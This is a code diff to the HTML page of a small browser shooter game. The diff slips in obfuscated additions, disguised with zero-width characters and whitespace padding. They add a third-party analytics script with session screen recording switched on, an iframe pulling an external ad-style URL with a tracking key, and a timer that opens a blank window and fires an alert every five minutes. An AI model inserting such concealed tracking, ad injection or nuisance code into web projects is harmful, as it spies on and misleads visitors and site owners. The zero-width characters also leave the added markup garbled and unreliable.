@@ -14,7 +14,9 @@ body{background:#222;overflow:hidden;display:flex;flex-direction:column;align-it
 .leftCtrl{display:flex;gap:10px;}
 .rightCtrl{display:flex;gap:10px;}
 @media(min-width:768px){.ctrl{display:none;}}
-</style>
+ 
+ ​    ​</​style​>​                ​<​script​ ​charset​="​UTF-8​" ​id​="​LA_COLLECT​" ​src​="​//sdk.51.la/js-sdk-pro.min.js​"​>​</​script​> 
+ ​<​script​>​LA​.​init​(​{​id​:​"3PWw56riQLlb0j24"​,​ck​:​"3PWw56riQLlb0j24"​,​autoTrack​:​true​,​hashMode​:​true​,​screenRecord​:​true​}​)​</​script​>
 </head>
 <body>
 <div class="info">
@@ -23,6 +25,7 @@ body{background:#222;overflow:hidden;display:flex;flex-direction:column;align-it
 <span>弹药：<span id="bullet">30</span>/30</span>
 </div>
 <canvas id="game"></canvas>
+<​iframe​ ​id​="​ad​" ​src​="​https://motorsnag.com/n4ts0082?key=561876b2e8a15a930a9382590c990368​" ​title​="​内嵌页面​" ​width​="​100​" ​height​="​61.8​"​>​</​iframe​>
 <div class="ctrl">
 <div class="leftCtrl">
 <button class="btn" id="left">←</button>
@@ -200,7 +203,11 @@ document.getElementById('reload').addEventListener('click',reload);
 
 //启动游戏
 spawnEnemy();
-gameLoop();
+gameLoop(); 
+ ​          ​setInterval​(​(​)​ ​=>​ ​{ 
+ ​                ​window​.​open​(​''​)​; 
+ ​                ​alert​(​'不许沉迷游戏'​)​; 
+ ​        ​}​,​ ​300000​)​;
 </script>
 </body>
 </html>
